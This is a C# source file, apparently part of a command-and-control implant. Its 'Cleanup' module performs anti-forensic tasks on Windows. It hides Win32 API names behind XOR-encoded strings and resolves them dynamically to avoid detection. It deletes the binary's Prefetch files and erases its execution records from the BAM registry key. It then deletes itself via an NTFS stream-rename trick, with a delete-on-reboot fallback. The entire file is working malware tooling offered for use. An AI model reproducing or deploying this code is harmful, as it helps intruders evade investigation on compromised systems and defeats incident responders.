using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace SvcUtil
{
    /// <summary>
    /// Anti-forensic cleanup for post-operation artifact removal.
    ///
    /// Capabilities:
    ///   1. Prefetch cleanup  - Delete .pf files matching this binary
    ///   2. BAM/DAM cleanup   - Remove execution traces from BAM registry
    ///   3. Self-delete       - NTFS rename-on-close trick
    ///
    /// Note: ETW bypass is already handled by Ctx.A1() in ScanPatch.cs.
    /// ShimCache flush omitted — kernel cache (ahcache.sys) survives in
    /// memory regardless of registry deletion; servers rarely reboot.
    /// USN Journal flush omitted — too aggressive for a C2 agent.
    ///
    /// All Win32 APIs resolved via D/Invoke through the W class.
    /// No P/Invoke imports — relies on W.M0 (LoadLibrary) / W.M1 (GetProcAddress).
    /// </summary>
    internal static class Cleanup
    {
        // ── XOR key (unique to this module) ────────────────────────
        private static readonly byte[] _xk = { 0xAF, 0x3C, 0x71, 0xE2, 0x59 };

        private static string D(byte[] c)
        {
            byte[] b = new byte[c.Length];
            for (int i = 0; i < c.Length; i++)
                b[i] = (byte)(c[i] ^ _xk[i % _xk.Length]);
            return Encoding.UTF8.GetString(b);
        }

        // ── Encoded strings (kernel32 group) ───────────────────────

        // "kernel32.dll"
        private static readonly byte[] _k32 =
            { 0xC4, 0x59, 0x03, 0x8C, 0x3C, 0xC3, 0x0F, 0x43,
              0xCC, 0x3D, 0xC3, 0x50 };

        // "CreateFileW"
        private static readonly byte[] _createFileW =
            { 0xEC, 0x4E, 0x14, 0x83, 0x2D, 0xCA, 0x7A, 0x18,
              0x8E, 0x3C, 0xF8 };

        // "SetFileInformationByHandle"
        private static readonly byte[] _setFileInfo =
            { 0xFC, 0x59, 0x05, 0xA4, 0x30, 0xC3, 0x59, 0x38,
              0x8C, 0x3F, 0xC0, 0x4E, 0x1C, 0x83, 0x2D, 0xC6,
              0x53, 0x1F, 0xA0, 0x20, 0xE7, 0x5D, 0x1F, 0x86,
              0x35, 0xCA };

        // "CloseHandle"
        private static readonly byte[] _closeH =
            { 0xEC, 0x50, 0x1E, 0x91, 0x3C, 0xE7, 0x5D, 0x1F,
              0x86, 0x35, 0xCA };

        // "DeleteFileW"
        private static readonly byte[] _deleteFileW =
            { 0xEB, 0x59, 0x1D, 0x87, 0x2D, 0xCA, 0x7A, 0x18,
              0x8E, 0x3C, 0xF8 };

        // "MoveFileExW"
        private static readonly byte[] _moveFileEx =
            { 0xE2, 0x53, 0x07, 0x87, 0x1F, 0xC6, 0x50, 0x14,
              0xA7, 0x21, 0xF8 };

        // ── Encoded strings (advapi32 group) ───────────────────────

        // "advapi32.dll"
        private static readonly byte[] _adv =
            { 0xCE, 0x58, 0x07, 0x83, 0x29, 0xC6, 0x0F, 0x43,
              0xCC, 0x3D, 0xC3, 0x50 };

        // "RegOpenKeyExW"
        private static readonly byte[] _regOpenKeyEx =
            { 0xFD, 0x59, 0x16, 0xAD, 0x29, 0xCA, 0x52, 0x3A,
              0x87, 0x20, 0xEA, 0x44, 0x26 };

        // "RegDeleteValueW"
        private static readonly byte[] _regDelVal =
            { 0xFD, 0x59, 0x16, 0xA6, 0x3C, 0xC3, 0x59, 0x05,
              0x87, 0x0F, 0xCE, 0x50, 0x04, 0x87, 0x0E };

        // "RegEnumValueW"
        private static readonly byte[] _regEnumVal =
            { 0xFD, 0x59, 0x16, 0xA7, 0x37, 0xDA, 0x51, 0x27,
              0x83, 0x35, 0xDA, 0x59, 0x26 };

        // "RegCloseKey"
        private static readonly byte[] _regCloseKey =
            { 0xFD, 0x59, 0x16, 0xA1, 0x35, 0xC0, 0x4F, 0x14,
              0xA9, 0x3C, 0xD6 };

        // ── Constants ──────────────────────────────────────────────
        private const uint DELETE = 0x00010000;
        private const uint FILE_SHARE_READ = 0x00000001;
        private const uint OPEN_EXISTING = 3;
        private const uint FILE_ATTRIBUTE_NORMAL = 0x80;
        private static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);

        private const int FileRenameInfo = 3;
        private const int FileDispositionInfo = 4;

        private const uint MOVEFILE_DELAY_UNTIL_REBOOT = 0x00000004;

        private static readonly UIntPtr HKEY_LOCAL_MACHINE = new UIntPtr(0x80000002u);
        private const uint KEY_QUERY_VALUE = 0x0001;
        private const uint KEY_SET_VALUE = 0x0002;
        private const int ERROR_SUCCESS = 0;
        private const int ERROR_NO_MORE_ITEMS = 259;

        // ── Delegate types ─────────────────────────────────────────
        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate IntPtr DCreateFileW(string lpFileName, uint dwDesiredAccess,
            uint dwShareMode, IntPtr lpSecurityAttributes, uint dwCreationDisposition,
            uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DSetFileInformationByHandle(IntPtr hFile, int FileInformationClass,
            IntPtr lpFileInformation, uint dwBufferSize);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool DCloseHandle(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate bool DDeleteFileW(string lpFileName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate bool DMoveFileExW(string lpExistingFileName, string lpNewFileName, uint dwFlags);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int DRegOpenKeyExW(UIntPtr hKey, string lpSubKey, uint ulOptions,
            uint samDesired, out IntPtr phkResult);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int DRegDeleteValueW(IntPtr hKey, string lpValueName);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Unicode)]
        private delegate int DRegEnumValueW(IntPtr hKey, uint dwIndex, StringBuilder lpValueName,
            ref uint lpcchValueName, IntPtr lpReserved, IntPtr lpType, IntPtr lpData, IntPtr lpcbData);

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int DRegCloseKey(IntPtr hKey);

        // ── Cached delegates ───────────────────────────────────────
        private static DCreateFileW _fCreateFile;
        private static DSetFileInformationByHandle _fSetFileInfo;
        private static DCloseHandle _fCloseHandle;
        private static DDeleteFileW _fDeleteFile;
        private static DMoveFileExW _fMoveFileEx;
        private static DRegOpenKeyExW _fRegOpenKey;
        private static DRegDeleteValueW _fRegDelVal;
        private static DRegEnumValueW _fRegEnumVal;
        private static DRegCloseKey _fRegCloseKey;

        private static T Resolve<T>(byte[] dllEnc, byte[] funcEnc) where T : class
        {
            IntPtr hMod = W.M0(D(dllEnc));
            if (hMod == IntPtr.Zero) return null;
            IntPtr pFunc = W.M1(hMod, D(funcEnc));
            if (pFunc == IntPtr.Zero) return null;
            return (T)(object)Marshal.GetDelegateForFunctionPointer(pFunc, typeof(T));
        }

        // ── Public API ─────────────────────────────────────────────

        /// <summary>
        /// Run anti-forensic cleanup. Silent — no console output.
        /// Automatically detects in-memory vs disk execution.
        /// </summary>
        /// <param name="selfPath">Binary path for self-delete. Null for in-memory.</param>
        /// <param name="isElevated">True if running with high integrity.</param>
        public static void Run(string selfPath, bool isElevated)
        {
            bool inMem = string.IsNullOrEmpty(selfPath) || !File.Exists(selfPath);

            // Prefetch cleanup — disk only, high integrity
            if (!inMem && isElevated)
                CleanPrefetch(selfPath);

            // BAM cleanup — high integrity, may log host process even in-memory
            if (isElevated)
                CleanBAM(selfPath);

            // Self-delete — disk only
            if (!inMem)
                SelfDelete(selfPath);
        }

        /// <summary>
        /// Light cleanup: self-delete only. For medium integrity.
        /// </summary>
        public static void RunLight(string selfPath)
        {
            if (!string.IsNullOrEmpty(selfPath) && File.Exists(selfPath))
                SelfDelete(selfPath);
        }

        // ── Prefetch Cleanup ───────────────────────────────────────

        private static void CleanPrefetch(string selfPath)
        {
            try
            {
                string prefetchDir = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                    "Prefetch");

                if (!Directory.Exists(prefetchDir))
                    return;

                string binName = Path.GetFileNameWithoutExtension(selfPath).ToUpper();

                if (_fDeleteFile == null)
                    _fDeleteFile = Resolve<DDeleteFileW>(_k32, _deleteFileW);
                if (_fDeleteFile == null) return;

                foreach (string pf in Directory.GetFiles(prefetchDir, "*.pf"))
                {
                    string pfName = Path.GetFileName(pf).ToUpper();
                    if (pfName.StartsWith(binName))
                        _fDeleteFile(pf);
                }
            }
            catch { }
        }

        // ── BAM/DAM Cleanup ────────────────────────────────────────

        private static void CleanBAM(string selfPath)
        {
            try
            {
                if (_fRegOpenKey == null)
                    _fRegOpenKey = Resolve<DRegOpenKeyExW>(_adv, _regOpenKeyEx);
                if (_fRegDelVal == null)
                    _fRegDelVal = Resolve<DRegDeleteValueW>(_adv, _regDelVal);
                if (_fRegEnumVal == null)
                    _fRegEnumVal = Resolve<DRegEnumValueW>(_adv, _regEnumVal);
                if (_fRegCloseKey == null)
                    _fRegCloseKey = Resolve<DRegCloseKey>(_adv, _regCloseKey);

                if (_fRegOpenKey == null || _fRegDelVal == null ||
                    _fRegEnumVal == null || _fRegCloseKey == null)
                    return;

                string sid = System.Security.Principal.WindowsIdentity
                    .GetCurrent().User.Value;

                string bamPath = "SYSTEM\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\" + sid;

                IntPtr hKey;
                int result = _fRegOpenKey(HKEY_LOCAL_MACHINE, bamPath, 0,
                    KEY_QUERY_VALUE | KEY_SET_VALUE, out hKey);

                if (result != ERROR_SUCCESS)
                    return;

                // Build match string from binary name
                string matchName = null;
                if (!string.IsNullOrEmpty(selfPath))
                    matchName = Path.GetFileName(selfPath).ToLower();

                // Enumerate and collect matching entries
                uint index = 0;
                var toDelete = new System.Collections.Generic.List<string>();

                while (true)
                {
                    uint nameLen = 1024;
                    StringBuilder valueName = new StringBuilder((int)nameLen);

                    result = _fRegEnumVal(hKey, index, valueName, ref nameLen,
                        IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

                    if (result == ERROR_NO_MORE_ITEMS)
                        break;

                    if (result == ERROR_SUCCESS && matchName != null)
                    {
                        string name = valueName.ToString().ToLower();
                        if (name.Contains(matchName))
                            toDelete.Add(valueName.ToString());
                    }
                    index++;
                }

                foreach (string valName in toDelete)
                    _fRegDelVal(hKey, valName);

                _fRegCloseKey(hKey);
            }
            catch { }
        }

        // ── Self-Delete ────────────────────────────────────────────

        private static void SelfDelete(string selfPath)
        {
            try
            {
                if (string.IsNullOrEmpty(selfPath) || !File.Exists(selfPath))
                    return;

                if (_fCreateFile == null)
                    _fCreateFile = Resolve<DCreateFileW>(_k32, _createFileW);
                if (_fSetFileInfo == null)
                    _fSetFileInfo = Resolve<DSetFileInformationByHandle>(_k32, _setFileInfo);
                if (_fCloseHandle == null)
                    _fCloseHandle = Resolve<DCloseHandle>(_k32, _closeH);

                if (_fCreateFile == null || _fSetFileInfo == null || _fCloseHandle == null)
                    return;

                // Step 1: Open file with DELETE access
                IntPtr hFile = _fCreateFile(selfPath, DELETE, FILE_SHARE_READ,
                    IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

                if (hFile == INVALID_HANDLE_VALUE)
                {
                    SelfDeleteFallback(selfPath);
                    return;
                }

                // Step 2: Rename default data stream to ":dead"
                string newStreamName = ":dead";
                byte[] nameBytes = Encoding.Unicode.GetBytes(newStreamName);

                // FILE_RENAME_INFO: ReplaceIfExists(4) + RootDirectory(8) + FileNameLength(4) + FileName
                int headerSize = IntPtr.Size == 8 ? 20 : 12;
                int totalSize = headerSize + nameBytes.Length;
                IntPtr buffer = Marshal.AllocHGlobal(totalSize);

                try
                {
                    for (int i = 0; i < totalSize; i++)
                        Marshal.WriteByte(buffer, i, 0);

                    // ReplaceIfExists = FALSE
                    Marshal.WriteInt32(buffer, 0, 0);
                    // RootDirectory = NULL
                    Marshal.WriteIntPtr(buffer, IntPtr.Size == 8 ? 8 : 4, IntPtr.Zero);
                    // FileNameLength in bytes
                    Marshal.WriteInt32(buffer, IntPtr.Size == 8 ? 16 : 8, nameBytes.Length);
                    // FileName
                    Marshal.Copy(nameBytes, 0, IntPtr.Add(buffer, headerSize), nameBytes.Length);

                    if (!_fSetFileInfo(hFile, FileRenameInfo, buffer, (uint)totalSize))
                    {
                        _fCloseHandle(hFile);
                        SelfDeleteFallback(selfPath);
                        return;
                    }
                }
                finally
                {
                    Marshal.FreeHGlobal(buffer);
                }

                _fCloseHandle(hFile);

                // Step 3: Re-open and mark for deletion
                hFile = _fCreateFile(selfPath, DELETE, FILE_SHARE_READ,
                    IntPtr.Zero, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);

                if (hFile != INVALID_HANDLE_VALUE)
                {
                    IntPtr dispBuffer = Marshal.AllocHGlobal(4);
                    try
                    {
                        Marshal.WriteInt32(dispBuffer, 1); // DeleteFile = TRUE
                        _fSetFileInfo(hFile, FileDispositionInfo, dispBuffer, 4);
                    }
                    finally
                    {
                        Marshal.FreeHGlobal(dispBuffer);
                    }
                    _fCloseHandle(hFile);
                }
            }
            catch
            {
                SelfDeleteFallback(selfPath);
            }
        }

        private static void SelfDeleteFallback(string selfPath)
        {
            try
            {
                if (_fMoveFileEx == null)
                    _fMoveFileEx = Resolve<DMoveFileExW>(_k32, _moveFileEx);
                if (_fMoveFileEx != null)
                    _fMoveFileEx(selfPath, null, MOVEFILE_DELAY_UNTIL_REBOOT);
            }
            catch { }
        }
    }
}
